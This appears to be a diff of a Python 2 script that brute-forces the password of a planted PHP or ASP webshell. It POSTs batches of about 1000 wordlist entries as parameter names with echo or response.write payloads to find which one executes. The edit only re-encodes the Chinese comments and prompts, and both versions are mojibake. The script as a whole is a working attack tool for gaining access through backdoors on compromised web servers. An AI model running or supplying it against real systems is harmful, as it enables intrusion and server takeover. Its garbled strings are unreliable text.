@@ -1,13 +1,13 @@
 # -*- coding: UTF-8 -*-
 #coding by v5est0r
-#µ¥´Î¶à±äÁ¿Ìá½»±äÁ¿·½Ê½,Ò»¾ä»°±¬ÆÆÌáËÙÇ§±¶
+#å•æ¬¡å¤šå˜é‡æäº¤å˜é‡æ–¹å¼,ä¸€å¥è¯çˆ†ç ´æé€Ÿåƒå€
  
 import requests,sys
 import ConfigParser
  
-shell = raw_input("ÇëÊäÈëÄ¾ÂíµÄurl£º")
-shell_type=raw_input("ÇëÊäÈëÄ¾Âí½Å±¾ÀàĞÍÈçasp£º")
-pass_dic=raw_input("ÇëÊäÈë×ÖµäÎÄ¼şÎ»ÖÃ£º")
+shell = raw_input("è¯·è¾“å…¥æœ¨é©¬çš„urlï¼š")
+shell_type=raw_input("è¯·è¾“å…¥æœ¨é©¬è„šæœ¬ç±»å‹å¦‚aspï¼š")
+pass_dic=raw_input("è¯·è¾“å…¥å­—å…¸æ–‡ä»¶ä½ç½®ï¼š")
  
 print '''
  
@@ -18,18 +18,18 @@ print '''
  
  
  
-post_data = {}  #´´½¨×Öµä¼¯
+post_data = {}  #åˆ›å»ºå­—å…¸é›†
 s = open(pass_dic,'r')
-content = s.readlines() #·ÖĞĞ¶ÁÈ¡×Öµä
+content = s.readlines() #åˆ†è¡Œè¯»å–å­—å…¸
 dics = len(content)/1000
  
-print 'µ±Ç°×ÖµäÖĞ±äÁ¿¸öÊıÎª: %s' % str(len(content))
+print 'å½“å‰å­—å…¸ä¸­å˜é‡ä¸ªæ•°ä¸º: %s' % str(len(content))
  
-print "×Öµä½«±»·Ö¸îÎª %s ·İ" % str(dics)
+print "å­—å…¸å°†è¢«åˆ†å‰²ä¸º %s ä»½" % str(dics)
  
-group = []  #×ÖµäÃ¿ĞĞ¶ÀÁ¢»¯,Ğ´ÈëÔª×é
+group = []  #å­—å…¸æ¯è¡Œç‹¬ç«‹åŒ–,å†™å…¥å…ƒç»„
 for h in range(0,len(content)):
-    password = str(content[h]).strip('\n')  #ÌŞ³ı»»ĞĞ·û
+    password = str(content[h]).strip('\n')  #å‰”é™¤æ¢è¡Œç¬¦
     group.append(password)
 #print group
  
@@ -48,7 +48,7 @@ if str(shell_type)=="php":
         for each in new_group:
             post_data[each] = 'echo "password is %s";' % each
         r = requests.post(shell, data=post_data)
-        #print "ÕıÔÚ½øĞĞµÚ %s ×é×Öµä±¬ÆÆ" % str(i + 1)
+        #print "æ­£åœ¨è¿›è¡Œç¬¬ %s ç»„å­—å…¸çˆ†ç ´" % str(i + 1)
         post_data.clear()
         i += 1
         print r.text
@@ -62,13 +62,13 @@ if str(shell_type)=="php":
     for each in new_group1:
         post_data[each] = 'echo "password is %s";' % each
     r = requests.post(shell, data=post_data)
-    print "ÕıÔÚ½øĞĞÓàÊı×Öµä±¬ÆÆ"
+    print "æ­£åœ¨è¿›è¡Œä½™æ•°å­—å…¸çˆ†ç ´"
     print r.text
  
 #v5est0r=response.write("password:v5est0r")
  
 if shell_type =='asp':
-    # ÏÂÃæ½¨Á¢´íÎóÃÜÂëµÄ·µ»Ø±êÊ¶·û
+    # ä¸‹é¢å»ºç«‹é”™è¯¯å¯†ç çš„è¿”å›æ ‡è¯†ç¬¦
     post_test = {'test_pass_test': 'response.write("test!!!")'}
     res = requests.post(shell, data=post_test)
     wrong_res = res.text
@@ -82,7 +82,7 @@ if shell_type =='asp':
         for each in new_group:
             post_data[each] = 'response.write("password: %s")' % each
         r = requests.post(shell, data=post_data)
-        print "ÕıÔÚ½øĞĞµÚ %s ×é×Öµä±¬ÆÆ" % str(i + 1)
+        print "æ­£åœ¨è¿›è¡Œç¬¬ %s ç»„å­—å…¸çˆ†ç ´" % str(i + 1)
         post_data.clear()
         i += 1
         print r.text
@@ -96,5 +96,5 @@ if shell_type =='asp':
     for each in new_group1:
         post_data[each] = 'response.write("password: %s\t")' % each
     r = requests.post(shell, data=post_data)
-    print "ÕıÔÚ½øĞĞÓàÊı×Öµä±¬ÆÆ"
+    print "æ­£åœ¨è¿›è¡Œä½™æ•°å­—å…¸çˆ†ç ´"
     print r.text
